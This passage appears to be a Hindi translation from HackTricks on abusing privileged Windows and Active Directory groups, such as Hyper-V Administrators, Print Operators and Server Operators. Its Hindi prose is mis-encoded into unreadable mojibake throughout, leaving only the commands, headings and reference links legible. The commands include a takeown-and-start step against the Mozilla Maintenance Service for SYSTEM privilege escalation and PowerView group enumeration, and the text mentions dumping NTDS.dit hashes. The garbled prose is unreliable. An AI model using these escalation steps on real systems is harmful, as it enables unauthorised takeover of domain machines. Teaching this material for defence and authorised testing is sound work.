рд╣рд╛рдЗрдкрд░-рд╡реА рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХреЛрдВ рдХреЛ рд╣рд╛рдЗрдкрд░-рд╡реА рдХрд╛ рдкреВрд░рд╛ рдЙрдкрдпреЛрдЧ рдорд┐рд▓рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рд╡рд░реНрдЪреБрдЕрд▓рд╛рдЗрдЬреНрдб рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рд▓рд╛рдЗрд╡ рдбреАрд╕реА рдХреНрд▓реЛрдирд┐рдВрдЧ рдФрд░ NTDS.dit рдлрд╝рд╛рдЗрд▓ рд╕реЗ NTLM рд╣реИрд╢ рдирд┐рдХрд╛рд▓рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред

### рд╢реЛрд╖рдг рдЙрджрд╛рд╣рд░рдг
Firefox рдХрд╛ Mozilla рд░рдЦрд░рдЦрд╛рд╡ рд╕реЗрд╡рд╛ рд╣рд╛рдЗрдкрд░-рд╡реА рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХреЛрдВ рджреНрд╡рд╛рд░рд╛ SYSTEM рдХреЗ рд░реВрдк рдореЗрдВ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рд╕реБрд░рдХреНрд╖рд┐рдд SYSTEM рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣рд╛рд░реНрдб рд▓рд┐рдВрдХ рдмрдирд╛рдирд╛ рдФрд░ рдЗрд╕реЗ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕реЗ рдмрджрд▓ рджреЗрдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
## рд╕рдВрдЧрдарди рдкреНрд░рдмрдВрдзрди

рдЬрд╣рд╛рдВ **Microsoft Exchange** рд▓рд╛рдЧреВ рд╣реИ, рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╕рдореВрд╣ рдЬрд┐рд╕реЗ **рд╕рдВрдЧрдарди рдкреНрд░рдмрдВрдзрди** рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдзрд╛рд░рдг рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╕рдореВрд╣ **рд╕рднреА рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдореЗрд▓рдмреЙрдХреНрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ** рдФрд░ **'Microsoft Exchange рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣'** рд╕рдВрдЧрдардирд┐рдХ рдЗрдХрд╛рдИ рдкрд░ **рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рдмрдирд╛рдП рд░рдЦрддрд╛ рд╣реИ**ред рдЗрд╕ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ **`Exchange Windows Permissions`** рд╕рдореВрд╣ рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╢реЛрд╖рдг рдФрд░ рдХрдорд╛рдВрдб

#### рдкреНрд░рд┐рдВрдЯ рдСрдкрд░реЗрдЯрд░реНрд╕
**рдкреНрд░рд┐рдВрдЯ рдСрдкрд░реЗрдЯрд░реНрд╕** рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп рдХрдИ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рд╕реЗ рд╕рдореНрдкрдиреНрди рд╣реЛрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИ **`SeLoadDriverPrivilege`**, рдЬреЛ рдЙрдиреНрд╣реЗрдВ **рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдПрдХ рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХ рдкрд░ рд▓реЙрдЧ рдСрди рдХрд░рдиреЗ**, рдЗрд╕реЗ рдмрдВрдж рдХрд░рдиреЗ рдФрд░ рдкреНрд░рд┐рдВрдЯрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╡рд┐рд╢реЗрд╖рддрдГ рдЕрдЧрд░ **`SeLoadDriverPrivilege`** рдПрдХ рдЕрдирдЙрдЪреНрдЪрд┐рдд рд╕рдВрджрд░реНрдн рдХреЗ рддрд╣рдд рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдирд┐рдпрдВрддреНрд░рдг (UAC) рдХреЛ рдЫрд▓рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рдХреА рд╕реВрдЪреА рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд PowerShell рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
### рд░рд┐рдореЛрдЯ рдбреЗрд╕реНрдХрдЯреЙрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛
рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рдХреЛ рд░рд┐рдореЛрдЯ рдбреЗрд╕реНрдХрдЯреЙрдк рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (RDP) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ PC рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред рдЗрди рд╕рджрд╕реНрдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП, PowerShell рдХрдорд╛рдВрдб рдЙрдкрд▓рдмреНрдз рд╣реИрдВ:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
#### рджреВрд░рд╕реНрде рдкреНрд░рдмрдВрдзрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛
рд╕рджрд╕реНрдп **Windows Remote Management (WinRM)** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ PC рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдЗрди рд╕рджрд╕реНрдпреЛрдВ рдХреА рдЬрд╛рдБрдЪ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рджреНрд╡рд╛рд░рд╛ рдХреА рдЬрд╛рддреА рд╣реИ:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
### рд╕рд░реНрд╡рд░ рдСрдкрд░реЗрдЯрд░реНрд╕
рдЗрд╕ рд╕рдореВрд╣ рдХреЛ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдкрд░ рд╡рд┐рднрд┐рдиреНрди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдмреИрдХрдЕрдк рдФрд░ рд░реАрд╕реНрдЯреЛрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░, рд╕рд┐рд╕реНрдЯрдо рд╕рдордп рдмрджрд▓рдирд╛, рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдмрдВрдж рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рд╕рджрд╕реНрдпреЛрдВ рдХреА рд╕реВрдЪреАрдХрд░рдг рдХреЗ рд▓рд┐рдП, рджрд┐рдпрд╛ рдЧрдпрд╛ рдХрдорд╛рдВрдб рд╣реИ:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## рд╕рдВрджрд░реНрдн <a href="#рд╕рдВрджрд░реНрдн" id="рд╕рдВрджрд░реНрдн"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рд╕реЗ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live) рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **PRs рд╕рдмрдорд┐рдЯ** рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
